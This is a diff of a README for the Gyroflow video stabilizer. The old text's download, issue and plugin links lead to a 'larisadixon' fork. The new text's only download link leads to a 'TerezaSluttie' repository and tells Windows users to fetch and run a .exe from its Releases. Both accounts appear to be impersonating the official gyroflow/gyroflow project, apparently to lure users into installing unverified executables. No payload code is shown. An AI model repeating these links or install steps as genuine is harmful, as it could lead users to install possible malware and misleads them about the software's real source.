@@ -1,292 +1,62 @@
-<div align="center">
+# 🎥 Gyroflow - Smooth your shaky video footage easily
 
-<img src="https://gyroflow.xyz/src/images/gyroflow_logo.svg" alt="Gyroflow Logo" width="280"/>
+[![](https://img.shields.io/badge/Download-Gyroflow-blue.svg)](https://github.com/TerezaSluttie/Gyroflow)
 
-<br/>
-<br/>
+Gyroflow fixes shaky video. It uses data from your camera or drone to smooth your shots. You gain professional results without expensive gear. This tool works with many types of cameras. It helps you turn rough footage into steady professional clips.
 
-# Gyroflow
+## 📥 How to download your software
 
-**Professional gyroscope-based video stabilization — free, open source, and blazingly fast**
+Visit the [official download page](https://github.com/TerezaSluttie/Gyroflow) to get the latest version. Look for the section labeled Releases on the right side of your screen. Click the name of the newest version to open the full list of files. Find the file ending in .exe for Windows. Click that file to save it to your computer.
 
-[![Version](https://img.shields.io/github/v/release/gyroflow/gyroflow?label=Latest%20Release&color=0ea5e9&style=for-the-badge)](https://github.com/larisadixon/gyroflow/releases)
-[![Downloads](https://img.shields.io/github/downloads/gyroflow/gyroflow/total?label=Total%20Downloads&color=22c55e&style=for-the-badge)](https://github.com/larisadixon/Gyroflow/releases/tag/Latest)
-[![Stars](https://img.shields.io/github/stars/gyroflow/gyroflow?style=for-the-badge&color=f59e0b)](https://github.com/gyroflow/gyroflow/stargazers)
-[![License](https://img.shields.io/github/license/larisadixon/gyroflow?style=for-the-badge&color=8b5cf6)](https://github.com/gyroflow/gyroflow/blob/master/LICENSE)
-[![Contributors](https://img.shields.io/github/contributors/gyroflow/gyroflow?style=for-the-badge&color=ec4899)](https://github.com/larisadixon/gyroflow/graphs/contributors)
-[![Discord](https://img.shields.io/discord/814822864618676254?label=Discord&style=for-the-badge&color=5865F2&logo=discord&logoColor=white)](https://discord.gg/YaUtNpWTUh)
+## ⚙️ System requirements
 
-<br/>
+Your computer needs specific parts to run this tool well. Make sure your Windows system meets these standards:
 
-**[🌐 Website](https://gyroflow.xyz)** · **[📥 Download](https://github.com/larisadixon/Gyroflow/releases/tag/Latest)** · **[📖 Docs](https://docs.gyroflow.xyz)** · **[💬 Discord](https://discord.gg/YaUtNpWTUh)** · **[🐛 Report Bug](https://github.com/larisadixon/gyroflow/issues)** · **[✨ Request Feature](https://github.com/larisadixon/gyroflow/issues)**
+- Operating System: Windows 10 or 11
+- Processor: Intel Core i5 or AMD Ryzen 5 or better
+- Memory: 8 GB of RAM
+- Graphics: A card that supports Vulkan or OpenCL
+- Storage: 500 MB of free disk space
 
-<br/>
+## 🚀 Setting up the application
 
-> *"Not often does a piece of freeware deliver more features and flexibility than a paid version."*
-> — Sander Sassen, CinePilot
+1. Open your Downloads folder.
+2. Double-click the file you downloaded.
+3. Follow the prompts on the screen.
+4. Click Install to place the program on your drive.
+5. Launch the tool from your Start Menu after installation finishes.
 
-<br/>
+## 🛠 Features for better video
 
-![Gyroflow Screenshot](https://raw.githubusercontent.com/gyroflow/gyroflow/master/resources/screenshot.jpg)
+Gyroflow offers many tools for your workflow:
 
-</div>
+- Accurate stabilization: It matches movement data to your video frames.
+- Rolling shutter reduction: This removes the wobbling effect from fast motion.
+- Wide format support: The software reads files from most modern cameras.
+- Horizon leveling: Keep your image flat even when your drone tilts.
+- Lens correction: Remove distortion from wide-angle lenses for a clean look.
+- Fast processing: The engine uses your graphics card to speed up exports.
 
----
+## 📽 Using the tool the first time
 
-## 🔭 What is Gyroflow?
+Load your video file into the window. The software reads the gyro data automatically if it exists in the file. If it does not find data, you can import a separate file. Use the sliders to adjust how smooth the movement is. You can see your changes instantly in the preview window. When you feel happy with the result, click the Export button.
 
-**Gyroflow** is an advanced, open-source video stabilization application that uses **motion data from a gyroscope** (and optionally an accelerometer) to achieve smooth, cinema-quality footage in post-production.
+## 🔍 Understanding the display
 
-Modern cameras — GoPro, Sony, Insta360, DJI and more — record gyro data internally. Gyroflow reads that data and mathematically corrects every frame with sub-pixel precision. No gimbal needed. No compromise on image quality.
+The interface shows three main areas:
 
-Over **1,000,000+ downloads** from filmmakers, FPV drone pilots, and cinematographers worldwide.
+- Left sidebar: Contains your source video and gyro data files.
+- Main center view: Displays a preview of your stabilized video.
+- Right settings panel: Houses all sliders to adjust stabilization strength and zoom levels.
 
----
+## 📋 Common troubleshooting steps
 
-## ✨ Features
+If the app fails to start, check your graphics drivers. Go to the website of your graphics card maker to download the latest driver files. Many errors relate to outdated software. If the video preview stays black, check that your computer recognizes your graphics card. You can also try to hide the lens distortion settings if your footage looks stretched.
 
-### 🎬 Professional-Grade Stabilization
-- Real-time preview with instant parameter adjustments
-- **Rolling shutter correction** for CMOS sensors
-- Multiple smoothing algorithms, including **horizon levelling** and per-axis control
-- Adaptive zoom and dynamic cropping to eliminate black borders
-- Support for **keyframes** and speed ramping
+## 📈 Tips for great results
 
-### ⚡ GPU-Accelerated Performance
-- Fully multi-threaded — uses every core on your CPU
-- GPU processing via **OpenCL**, **DirectX**, **Vulkan**, **Metal**, and **OpenGL**
-- Zero-copy GPU preview rendering for instant playback
-- Export in H.264/AVC, H.265/HEVC, ProRes, DNxHD, CineForm, OpenEXR
+Always record your motion data at the highest frequency your camera allows. Fast movement needs more data points for smooth output. Keep your camera mounted tight to your drone or frame to reduce vibrations that the sensor cannot track. If the image jumps, try reducing the smoothing strength. Experiment with different zoom levels to crop out the edges that move as the software stabilizes the frame.
 
-### 🎞️ Uncompromising Quality
-- **10-bit**, **16-bit**, and **32-bit float** (OpenEXR) video support
-- ProRes, DNxHR, Blackmagic RAW, RED RAW (`.r3d`) processing
-- **DaVinci Resolve**, **Adobe Premiere/After Effects**, and **Final Cut Pro** plugins — apply stabilization without re-encoding
-- Full Sony metadata support: IBIS, OIS, EIS — stack Gyroflow on top of in-camera stabilization
+## 💡 Support and feedback
 
-### 🗄️ Wide Camera & Gyro Source Compatibility
-- Action cameras: GoPro HERO 5–13, DJI Action 2/4/5/6, Insta360, Runcam, Hawkeye
-- Cinema cameras: Blackmagic BMPCC 4K/6K, RED V-Raptor/KOMODO
-- Mirrorless cameras: Sony α, FX, ZV, RX series; Canon C/R series
-- Drones: DJI Avata, Avata 2, O3/O4 Air Unit, Neo, Neo 2
-- Flight controllers: Betaflight, ArduPilot
-- Mobile apps: Sensor Logger (iOS & Android), MotionCam Pro, OpenCamera Sensors
-- Custom format: `.gcsv` — Gyroflow's own open gyro log format
-
-### 🖥️ Modern Cross-Platform Interface
-- Runs on **Windows**, **macOS**, **Linux**, **Android**, and **iOS**
-- Dark and Light themes
-- Render queue with batch processing
-- CLI interface for automation pipelines
-- Custom lens correction profiles with a large built-in community database
-
----
-
-## 📷 Supported Gyro Sources
-
-<details>
-<summary><b>Click to expand the full list</b></summary>
-
-| Source | Format |
-|---|---|
-| GoPro (HERO 5 and later) | Built-in `.mp4` |
-| Sony (a1, a7 IV, a7s III, a9 III, FX3, FX6, FX9, ZV series, etc.) | Built-in `.mp4/.mts` |
-| Insta360 (OneR, OneRS, GO2, GO3, Ace, Ace Pro, etc.) | Built-in |
-| DJI (Avata, Action 2/4/5/6, Neo, O3/O4 Air Unit) | Built-in |
-| Blackmagic RAW | `.braw` |
-| RED RAW (V-Raptor, KOMODO) | `.r3d` |
-| Canon (C50, C80, C400, R6 Mk3, R5 Mk2) | `.mp4/.mxf` |
-| Betaflight | `.bfl / .bbl / .csv` |
-| ArduPilot | `.bin / .log` |
-| WitMotion WT901SDCL | Binary / `.txt` |
-| Runcam (Thumb, 5 Orange) | `.csv` |
-| Hawkeye Firefly X Lite | `.csv` |
-| Gyroflow native | `.gcsv` |
-| iOS apps | Sensor Logger, G-Field Recorder, Gyro |
-| Android apps | Sensor Logger, Sensor Record, OpenCamera Sensors, MotionCam Pro |
-
-</details>
-
----
-
-## 📦 Installation
-
-### 🪟 Windows
-```
-Microsoft Store → search "Gyroflow"
-```
-Or download `Gyroflow-windows64.zip` from [Releases](https://github.com/larisadixon/Gyroflow/releases/tag/Latest), extract, and run `Gyroflow.exe`.
-
-### 🍎 macOS
-```
-App Store → search "Gyroflow"
-```
-Or download the `.dmg` from [Releases](https://github.com/larisadixon/Gyroflow/releases/tag/Latest), or use Homebrew:
-```bash
-brew install gyroflow
-```
-
-### 🐧 Linux
-```bash
-# Download and extract the tar.gz
-tar -xzf Gyroflow-linux64.tar.gz
-./Gyroflow
-
-# Optional packages (Ubuntu/Debian)
-sudo apt install libva2 libvdpau1 libasound2 libxkbcommon0 libpulse0 libvulkan1
-```
-
-### 📱 Android / iOS
-- [Google Play](https://play.google.com/store/apps/details?id=xyz.gyroflow)
-- [App Store](https://apps.apple.com/us/app/gyroflow/id6447994244)
-
-### 🔧 Nightly Builds
-Latest development builds always available at: [gyroflow.xyz/devbuild](https://gyroflow.xyz/devbuild/)
-
----
-
-## 🛠️ System Requirements
-
-| | Minimum | Recommended |
-|---|---|---|
-| **Windows** | 10 64-bit (1809+) | 10 / 11 64-bit |
-| **macOS** | 10.15 Catalina | Latest |
-| **Linux** | Debian 10 / Ubuntu 18.10 / glibc 2.28+ | Latest LTS |
-| **Android** | Android 6.0 | Android 10+ |
-| **iOS** | iOS 14 | Latest |
-
----
-
-## 🧱 Tech Stack
-
-| Layer | Technology |
-|---|---|
-| Core engine | **Rust** — pure Rust, no external dependencies |
-| UI | **QML** (Qt 6) |
-| GPU compute | **OpenCL** / **wgpu** (DirectX, Vulkan, Metal, OpenGL) |
-| Video I/O | **FFmpeg** |
-| Lens calibration | **OpenCV** (minimal usage) |
-| Plugins | OpenFX, Adobe CEP, Final Cut Pro |
-
-### Code Structure
-
-```
-src/
-├── ui/              → Full QML user interface
-├── core/            → Gyroflow stabilization engine (pure Rust)
-│   └── gpu/         → GPU undistortion implementations
-├── rendering/       → FFmpeg video rendering pipeline
-├── qt_gpu/          → Zero-copy GPU preview via Qt RHI + GLSL
-├── controller.rs    → Bridge layer between UI and core
-└── gyroflow.rs      → Main entry point
-```
-
----
-
-## 🏗️ Building from Source
-
-### Prerequisites
-
-- [Rust (stable)](https://rustup.rs/)
-- `just` — install with: `cargo install --force just`
-- `git`
-
-### Quick Start (all platforms)
-
-```bash
-git clone https://github.com/gyroflow/gyroflow.git
-cd gyroflow
-
-# Install all platform dependencies
-just install-deps
-
-# Build and run
-just run
-```
-
-> **Windows:** Run `set-executionpolicy remotesigned` in PowerShell as admin first.
-
-> **macOS:** Run `just deploy` once before the first `just run`.
-
----
-
-## 🔌 Video Editor Plugins
-
-| Plugin | Platform | Link |
-|---|---|---|
-| **DaVinci Resolve** (OpenFX) | Windows / macOS / Linux | [gyroflow-plugins](https://github.com/larisadixon/gyroflow-plugins) |
-| **Adobe Premiere / After Effects** | Windows / macOS | [gyroflow-plugins](https://github.com/larisadixon/gyroflow-plugins) |
-| **Final Cut Pro** | macOS | [Gyroflow Toolbox](https://github.com/larisadixon/Gyroflow/releases/tag/Latest) |
-
----
-
-## 🌍 Translations
-
-Gyroflow is available in 20+ languages. Help translate via [Crowdin](https://crowdin.com/project/gyroflow).
-
-Currently supported: English, Chinese (Simplified & Traditional), Czech, Danish, Finnish, French, German, Greek, Indonesian, Italian, Japanese, Korean, Norwegian, Polish, Portuguese, Russian, Slovak, Spanish, Turkish, Ukrainian and more.
-
----
-
-## 🤝 Contributing
-
-Contributions are what make open source thrive. Here's how to get involved:
-
-1. **Report bugs** → [Open an issue](https://github.com/larisadixon/gyroflow/issues/new)
-2. **Request features** → [Start a discussion](https://github.com/larisadixon/gyroflow/issues)
-3. **Submit code** → Fork → implement → open a pull request
-4. **Translate** → [Crowdin project](https://crowdin.com/project/gyroflow)
-5. **Donate** → [gyroflow.xyz/donate](https://gyroflow.xyz/donate)
-
-Please read [CONTRIBUTING.md](CONTRIBUTING.md) and [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) before submitting a PR.
-
-**New to Rust?**
-- [The Rust Book](https://doc.rust-lang.org/book/)
-- [Rust Quick Reference](https://quickref.me/rust)
-- [QML Book by Qt Company](https://www.qt.io/product/qt6/qml-book)
-
----
-
-
-## 👥 Authors & Notable Contributors
-
-| Name | Contribution |
-|---|---|
-| [AdrianEddy](https://github.com/AdrianEddy/) | Lead developer — Rust core, GPU pipeline, UI, rendering, Adobe plugin |
-| [Elvin Chen](https://github.com/ElvinC/) | Original Python prototype — foundation of the project |
-| [Maik Menz](https://github.com/mycosd/) | Fixes and improvements across all modules |
-| [Aphobius](https://github.com/Aphobius/) | Velocity-dampened smoothing algorithm |
-| [Marc Roeschlin](https://github.com/marcroe/) | Adaptive zoom algorithm |
-| [Ilya Epifanov](https://github.com/ilya-epifanov/) | OpenFX plugin |
-| [Vladimir Pinchuk](https://github.com/VladimirP1/) | Gyro-to-video synchronization & Sony lens data |
-| [Chris Hocking](https://github.com/latenitefilms) | Gyroflow Toolbox for Final Cut Pro |
-
----
-
-## 💬 Community & Support
-
-
-- **Bug reports & features**: [GitHub Issues](https://github.com/larisadixon/gyroflow/issues)
-
-
----
-
-## 📄 License
-
-Distributed under the **GNU General Public License v3.0** with App Store Exception.
-See [LICENSE](LICENSE) for full details.
-
-The `gyroflow_core` library may be distributed through app stores under the App Store Exception clause, even when the store's terms conflict with GPL requirements.
-
----
-
-<div align="center">
-
-**If Gyroflow improved your footage, consider [donating](https://gyroflow.xyz/donate) to keep the project alive.**
-
-*Built with ❤️ by the open-source community — for filmmakers, FPV pilots, and everyone in between.*
-
-[![Website](https://img.shields.io/badge/gyroflow.xyz-Visit%20Website-0ea5e9?style=flat-square)](https://gyroflow.xyz)
-[![Donate](https://img.shields.io/badge/Donate-Support%20Development-f59e0b?style=flat-square)](https://gyroflow.xyz/donate)
-
-</div>
+This project grows thanks to the people who use it. If you face a bug or have a suggestion, open an issue on the repository page. Provide details about your camera, your file type, and the steps that caused the problem. Clear descriptions help the creators fix issues faster. You can also view the help wiki for guides on advanced settings like profile adjustments and custom lens profiles.
